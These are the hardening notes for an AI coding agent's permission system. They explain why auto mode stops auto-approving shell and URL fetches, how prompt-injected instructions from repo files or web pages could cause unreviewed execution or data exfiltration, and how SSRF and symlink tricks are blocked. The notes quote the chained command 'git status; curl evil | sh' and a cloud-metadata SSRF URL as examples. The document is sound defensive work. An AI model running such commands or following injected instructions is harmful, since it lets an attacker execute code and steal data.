# Hardening notes

This fork changes a number of security-relevant defaults. `packages/agent-core-v2`,
`packages/kap-server` and `packages/transcript` are comment-free zones enforced by
`scripts/check-no-comments.mjs`, so the reasoning behind each change lives here
instead of next to the code.

Each entry names the file, quotes the line the reasoning attaches to, and gives the
rationale. Line numbers are from the commit that introduced the note and will drift.


### `packages/agent-core-v2/src/agent/permissionPolicy/permissionPolicyService.ts`

**`this.policies = [`** (was line 38)

> Order matters: the first policy to return a result wins.
> 
> `AutoModeApprove` sits after the content-sensitive asks (secrets on
> disk, the .git control directory, and files a later command executes)
> rather than ahead of them, so
> enabling auto mode speeds up ordinary work without also silently
> waiving the checks that exist for the highest-consequence paths.
> Everything else keeps its previous relative order: an explicit prior
> approval (`SessionApprovalHistory`) or a user `allow` rule still wins,
> so this does not re-prompt for something already approved.


### `packages/agent-core-v2/src/agent/permissionPolicy/policies/auto-mode-approve.ts`

**`const AUTO_MODE_EXCLUDED_TOOLS = new Set<string>(['Bash', 'FetchURL']);`** (was line 8)

> Tools that auto mode does not blanket-approve.
> 
> Auto mode exists to take friction out of ordinary work, and headless runs
> (`kimi -p`) turn it on for the whole session. Bash runs arbitrary commands,
> so approving it purely because the mode is `auto` turns any instruction the
> model picked up — including one that arrived in a repo file, an issue, or a
> fetched page — into an unreviewed shell execution.
> 
> `FetchURL` is here for the matching reason on the way out: it sends
> caller-chosen bytes to a caller-chosen host, and an unattended session is
> exactly where nobody would notice it happening.
> 
> Excluding them here does not deny them: the call falls through to the rest
> of the chain, so a user `[permission] allow` rule still authorizes it. That
> makes the grant explicit and auditable instead of implied by the mode.

**`const AUTO_APPROVE_BASH_ENV = 'KIMI_CODE_AUTO_APPROVE_BASH';`** (was line 27)

> Escape hatch for operators who accept the risk and need the previous
> behaviour (an existing unattended pipeline, say). Off by default.


### `packages/agent-core-v2/src/agent/permissionPolicy/policies/default-tool-approve.ts`

**`const DEFAULT_APPROVE_TOOLS = new Set([`** (was line 7)

> Tools that run without asking.
> 
> `FetchURL` is deliberately absent. It is the one tool here that sends
> caller-chosen bytes to a caller-chosen host, which makes it the sink half of
> an exfiltration pair: anything the agent can read, it could otherwise put in
> a URL and ship out without the user seeing a prompt. The SSRF guard blocks
> internal targets but not public ones, so the gate has to be approval rather
> than address filtering. A user `[permission] allow = ["FetchURL"]` rule
> restores the previous behaviour explicitly.


### `packages/agent-core-v2/src/agent/permissionPolicy/policies/execution-trigger-write-ask.ts`

**`const EXECUTION_TRIGGER_BASENAMES = new Set<string>([`** (was line 15)

> Files whose contents a routine follow-up command executes.
> 
> Writes inside the workspace are otherwise approved without asking, which is
> the right default for source files: editing them is the job, and the change
> is visible in the diff before anything runs it. These are different. Nothing
> happens when they are written, and then the next `npm install`, test run, or
> CI job executes what they now say — so the write is the dangerous act and
> the prompt has to happen there, not at the point it finally runs.

**`const EXECUTION_TRIGGER_DIR_PREFIXES = [`** (was line 40)

> Directories where every file is executed by CI or a git operation.
> Compared against workspace-relative POSIX paths.

**`export class ExecutionTriggerWriteAskPermissionPolicyService implements PermissionPolicy {`** (was line 58)

> Ask before writing a file that a later command will execute.
> 
> Sits ahead of the blanket in-workspace write approval, and ahead of auto
> mode, for the same reason the sensitive-file check does: these are the
> writes where "it was inside the repo" is not a good enough reason to skip
> the prompt. Session history and user `allow` rules still take precedence,
> so an operator who has decided this is fine is not asked twice.


### `packages/agent-core-v2/src/app/capability/entries/kimiCu.ts`

**`} finally {`** (was line 457)

> The quarantine attribute is deliberately left in place: this bundle
> is fetched over the network and is not verified against a published
> checksum or signature here, so Gatekeeper stays the backstop and the
> user gets its prompt on first launch.


### `packages/agent-core-v2/src/app/capability/host.ts`

**`await rm(destPath, { force: true }).catch(() => {});`** (was line 144)

> Never leave an unverified artifact on disk where a later step could
> pick it up and execute it.


### `packages/agent-core-v2/src/app/plugin/source.ts`

**`function isLoopbackUrl(raw: string): boolean {`** (was line 21)

> Plaintext to the local machine has no network path to tamper with, so it
> stays allowed (local test servers, `pnpm dev:plugin-marketplace`). Plaintext
> to anything else does not.

**`throw new Error2(`** (was line 42)

> A plugin archive is executable content: it can ship an mcpServers
> command that gets spawned. Over plaintext there is nothing binding the
> bytes to the publisher, so refuse rather than trust the network.


### `packages/agent-core-v2/src/app/web/providers/local-fetch-url.ts`

**`const PRIVATE_IPV4_SUBNETS: readonly (readonly [string, number])[] = [`** (was line 207)

> NAT64 (RFC 6052) embeds an IPv4 address in the low 32 bits of the
> well-known prefix 64:ff9b::/96. Those are ordinary IPv6 addresses that the
> v4 rules do not cover, so on a NAT64 network they would translate straight
> through to the embedded v4 target. Each private v4 range is mirrored into
> NAT64 space (prefix 96 + the v4 prefix length); public v4 addresses reached
> over NAT64 stay allowed. The local-use prefix 64:ff9b:1::/48 (RFC 8215) has
> no fixed embedding offset, so it is blocked wholesale.


### `packages/agent-core-v2/src/session/agentLifecycle/agentLifecycleService.ts`

**`const configuredRules = this.config.get<PermissionConfig>(PERMISSION_SECTION)?.rules;`** (was line 409)

> Seed the agent with the user's persisted `[permission]` rules. The
> `permission.rules.add` Op is not persisted, so a rules model always
> starts empty and has to be filled here — otherwise the config section
> parses fine but the user-configured policies never see a rule to match.


### `packages/agent-core-v2/src/tool/path-access.ts`

**`const SENSITIVE_DIRECTORY_SEGMENTS: readonly (readonly string[])[] = [`** (was line 37)

> Directories whose contents are credentials whatever the file is called.
> Private keys and cloud credential files are routinely given local names
> (`deploy_key`, `work-cluster.json`), so a basename list cannot cover them.
> Public keys and the host-key caches carry no secret and stay readable.

**`const SENSITIVE_DIRECTORY_EXEMPT_SUFFIXES = ['.ssh/config', '.aws/config'];`** (was line 58)

> `config` is a secret in `.kube` but not in `.ssh` (host aliases) or `.aws`
> (region settings), so the exemption is per-directory rather than by name.

**`async function realpathExistingPrefix(abs: string, fs: PathRealpathResolver): Promise<string> {`** (was line 361)

> Resolve the longest existing prefix of `abs` through symlinks and re-attach
> the not-yet-existing tail. A write to a new file still gets its parent
> directory resolved, which is where a redirect would sit.

**`export async function assertRealPathAccess(`** (was line 398)

> Symlink-aware re-check, run at execution time.
> 
> `resolvePathAccess` canonicalizes lexically, so a symlink that sits inside
> the workspace still reads as inside it — while the OS follows the link at
> open time. This re-runs the two checks against the resolved target:
> 
>   - a path that looked inside the workspace must still be inside it once
>     symlinks are resolved (a path the caller already gave as outside is
>     governed by the approval layer, so it is left alone here);
>   - the resolved target must not be a sensitive file, even when the link
>     itself has an innocuous name.
> 
> Costs nothing on the common path: when nothing along the path is a symlink
> the resolved path equals the canonical one and this returns immediately.


### `packages/agent-core-v2/src/tool/rule-match.ts`

**`const BASH_RULE_PARSE_OPTIONS = { timeoutMs: 50, maxNodes: 20_000 } as const;`** (was line 143)

> Budget for the permission-path parse. Small on purpose: this runs on the hot
> path of every rule check, and a command that cannot be parsed inside it is
> treated as un-analyzable (and therefore not eligible for a wildcard match).

**`export function isSingleSimpleCommand(command: string): boolean {`** (was line 156)

> Whether `command` is a single simple command rather than a compound one.
> 
> Uses the bash parser rather than scanning for metacharacters, because the
> two disagree exactly where it matters: `git commit -m "a; b"` is one command
> (the `;` is inside a string), while `git status; curl x | sh` is three.
> 
> Anything the parser cannot analyze — budget exhausted, or a tree with
> errors — is reported as not-simple, so an unparseable command degrades to
> "needs approval" instead of slipping through a wildcard rule.

**`export function matchesBashCommandRuleSubject(`** (was line 173)

> Rule matching for shell commands.
> 
> A wildcard rule describes a shape of command the user is comfortable with;
> it should not also authorize whatever got chained onto it. `Bash(git *)`
> matching `git status; curl evil | sh` would turn a narrow grant into an
> arbitrary one, so a permissive (allow) rule only matches when the command is
> a single simple command.
> 
> Two cases stay untouched: an exact-literal rule (what "approve for this
> session" stores) still matches the command it was created from, compound or
> not; and non-permissive rules (deny / ask) match exactly as before, so this
> never weakens a block.


### `packages/agent-core-v2/src/tool/toolContract.ts`

**`readonly matchesRule?:`** (was line 86)

> `options.permissive` is true when the rule being tested would GRANT access
> (an `allow` rule). A tool may hold a permissive match to a higher standard
> than a deny match without weakening deny.


### `packages/agent-core-v2/test/agent/permissionPolicy/permissionPolicyService.test.ts`

**`mode = 'auto';`** (was line 622)

> Auto mode speeds up ordinary work; it must not silently waive the
> secrets check.

**`mode = 'auto';`** (was line 648)

> Auto mode should remove friction, not convert model-chosen shell
> commands into unreviewed execution.

**`for (const rel of [`** (was line 678)

> These are approved-by-default in-workspace writes today; nothing runs at
> write time, and then the next install/test/CI run executes them.

**`const result = await evaluate({`** (was line 724)

> Reading package.json is routine; only writing it is the risk.


### `packages/agent-core-v2/test/agent/permissionPolicy/policies/default-tool-approve.test.ts`

**`expect(policy.evaluate(policyContext('FetchURL', { url: 'https://example.com' }))).toBeUndefined();`** (was line 89)

> FetchURL sends caller-chosen bytes to a caller-chosen host, so it is the
> sink half of an exfiltration pair and has to go through approval.


### `packages/agent-core-v2/test/agent/permissionRules/matchesRule.test.ts`

**`for (const command of [`** (was line 179)

> The grant was "git commands"; it must not also cover what was appended.

**`expect(matchesBashCommandRuleSubject('git *', 'git commit -m "a; b"', allow)).toBe(true);`** (was line 197)

> A metacharacter scan would reject this; the parse says one command.

**`const command = 'git status; echo done';`** (was line 202)

> This is what "approve for this session" stores.


### `packages/agent-core-v2/test/app/capability/host.test.ts`

**`const HELLO_SHA256 = 'b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9';`** (was line 155)

> sha256('hello world')

**`await expect(readFile(dest, 'utf-8')).rejects.toThrow();`** (was line 185)

> The unverified bytes must not survive on disk for a later step to run.


### `packages/agent-core-v2/test/app/web/providers/local-fetch-url.test.ts`

**`await expect(provider.fetch('http://[64:ff9b::169.254.169.254]/latest/meta-data')).rejects.toThrow(`** (was line 61)

> 64:ff9b::/96 (RFC 6052) carries the v4 address in its low 32 bits.

**`await expect(provider.fetch('http://[64:ff9b:1::a9fe:a9fe]/')).rejects.toThrow(`** (was line 71)

> 64:ff9b:1::/48 (RFC 8215) has no fixed embedding offset: blocked whole.


### `packages/agent-core-v2/test/session/agentLifecycle/agentLifecycle.test.ts`

**`ix.stub(IConfigService, {`** (was line 1021)

> The rules Op is not persisted, so without this seeding a user's
> `[permission]` deny/allow/ask config would parse but never reach the
> policy chain.


### `packages/agent-core-v2/test/tool/tool.test.ts`

**`vi.stubEnv('KIMI_CODE_AUTO_APPROVE_BASH', '1');`** (was line 4120)

> Auto mode no longer blanket-approves Bash; these hook-flow tests are
> about hook ordering, so opt in explicitly rather than gate on approval.

**`vi.stubEnv('KIMI_CODE_AUTO_APPROVE_BASH', '1');`** (was line 4177)

> Auto mode no longer blanket-approves Bash; these hook-flow tests are
> about hook ordering, so opt in explicitly rather than gate on approval.
